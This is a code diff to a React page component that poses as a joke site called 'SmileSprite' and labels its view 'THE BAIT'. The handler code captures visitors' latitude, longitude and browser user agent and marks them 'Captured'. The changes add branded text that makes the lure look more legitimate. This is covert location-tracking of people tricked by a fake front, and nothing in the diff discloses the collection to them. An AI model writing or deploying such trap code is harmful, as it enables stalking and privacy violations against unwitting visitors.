@@ -43,7 +43,7 @@ export default function Home() {
             longitude: lng,
             device: navigator.userAgent
         });
-        setTrapData({ lat, lng, ip: "Captured ✅" });
+        setTrapData({ lat, lng, ip: "Captured" });
     } catch (error) {
         setTrapData({ lat, lng, ip: "Error Saving" });
     }
@@ -57,7 +57,8 @@ export default function Home() {
       {/* 1. THE BAIT */}
       {view === "bait" && (
         <div className="space-y-6">
-          <h1 className="text-4xl font-bold text-yellow-400">Need a laugh? 😂</h1>
+          <h1 className="text-4xl font-bold text-yellow-400">Welcome to SmileSprite 🥤</h1>
+          <p className="text-gray-300 mt-2">Fresh jokes served daily.</p>
           <button onClick={handleJokeClick} className="px-8 py-4 bg-blue-600 hover:bg-blue-500 text-xl font-bold rounded-full shadow-lg transition transform hover:scale-105">
             🃏 Get Joke
           </button>
